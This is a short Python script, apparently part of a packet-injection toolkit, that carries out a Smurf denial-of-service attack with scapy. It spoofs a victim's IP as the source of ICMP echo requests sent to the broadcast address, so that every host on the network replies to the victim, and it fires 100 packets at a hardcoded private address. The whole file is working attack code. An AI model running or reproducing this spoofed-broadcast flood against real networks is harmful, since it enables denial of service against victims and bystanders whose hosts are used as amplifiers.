#! /usr/bin/env python3
#ICMP Echo Request to broadcast address with victim’s IP as source, causing all hosts to reply to the victim.
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send
from packinjection.utils.inet import get_broadcast_ip

def smurf(target):
	pkt = IP(src=target, dst=get_broadcast_ip(target))/ICMP()
	print(pkt)
	send(pkt, count=100, inter=0.01) #do while loop for threads ot just more control

smurf("192.168.56.101")
